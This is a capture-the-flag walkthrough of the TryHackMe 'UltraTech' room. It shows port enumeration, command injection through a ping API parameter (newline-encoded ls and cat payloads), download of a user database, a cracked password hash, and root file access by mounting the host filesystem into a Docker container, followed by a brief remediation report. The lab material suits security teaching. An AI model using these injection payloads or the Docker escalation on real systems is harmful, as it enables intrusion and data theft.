
## UltraTech
https://tryhackme.com/room/ultratech1
## It's enumeration time!

**1. Which software is using the port 8081?**
```
nmap -p- -sC -sV -O target_ip
```

`Node.js`

**2. Which other non-standard port is used?**

`31331`

**3. Which software using this port?**
`Apache`

**4. Which GNU/Linux distribution seems to be used?**

`Ubuntu`

**5. The software using the port 8081 is a REST api, how many of its routes are used by the web application?**

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.136.202:31331
```

*Found  `/js`*   .

*Checked with:*

```
curl http://10.10.136.202:31331/js/api.js
```

*Deduced:*

```
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
 return ${window.location.hostname}:8081
    }
    
    function checkAPIStatus() {
 const req = new XMLHttpRequest();
 try {
     const url = http://${getAPIURL()}/ping?ip=${window.location.hostname}
     req.open('GET', url, true);
     req.onload = function (e) {
  if (req.readyState === 4) {
      if (req.status === 200) {
   console.log('The api seems to be running')
      } else {
   console.error(req.statusText);
      }
  }
     };
     req.onerror = function (e) {
  console.error(xhr.statusText);
     };
     req.send(null);
 }
 catch (e) {
     console.error(e)
     console.log('API Error');
 }
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = http://${getAPIURL()}/auth;
    
})();
```

*Confirmed API routes:*

1. `/ping?ip=...`

2. `/auth`

`Answer: 2`


## Let the fun begin

**1. There is a database lying around, what is its filename?**

*Checked if the server sends ICMP requests (ping) to the specified IP:*

```
sudo tcpdump -i eth0 icmp
```

```
curl "http://target_ip:8081/ping?ip=my_ip%0Als"
```

Deduced list.

`Answer: utech.db.sqlite`

**2. What is the first user's password hash?**

*Downloaded the utech.db.sqlite.*

```
curl "http://target_ip:8081/ping?ip=my_ip%0Acat%20utech.db.sqlite" --output utech.db.sqlite
```
*Then:*
```
cat utech.db.sqlite
```

`f357a0c52799563c7c7b76c1e7543a32`

**3. What is the password associated with this hash?**

*Cracked using [CrackStation](https://crackstation.net).*

`n100906`


## The root of all evil

**What are the first 9 characters of the root user's private SSH key?**


*Conected ssh*.
```
ssh r00t@target_ip
```

Gained access through Docker:

```
docker images
docker run -v /:/mnt --rm -it bash
cd mnt
cd root
cat private.txt

```


```
docker run — start a new container
-v /:/mnt — mounts the host root (/) into the container at /mnt
--rm — removes the container automatically after exit
-i — leaves STDIN open (interactive mode)
-t — connects TTY (convenient terminal)
bash — base image with Bash shell
```
## Brief report

**Vulnerability:**
*Command Injection in REST API at:*

```
http://<IP>:8081/ping?ip=<user_input>
```


**Explanation**

*The `ip` parameter is not filtered and is directly substituted into the `ping` system command, which allows you to execute arbitrary commands on the server.*

**Gaining access**

*1. The utech.db.sqlite file was obtained via command injection.*
*2. The file contained a users table with password hashes.*
*3. One of the hashes was cracked, which gave access to the application or system.*
*4. Docker was spotted. Used:*

```
docker run -v /:/mnt --rm -it bash
```

*This allowed the host filesystem to be mounted inside the container and access to `/root/private.txt`.*

## Vulnerability level:

*Critical (full control over the system)
Possibility of escalation of rights via Docker (error in the configuration: no `--read-only`, `no-root`, and no restrictions on volume mounts)*


## Recommendations:
*Screen and validate user input.
Use an IP `allowlist`.
Restrict unsafe users from running Docker containers.
Disable the ability to mount the root file system `(/)` inside the container.*



## Well Done!!!

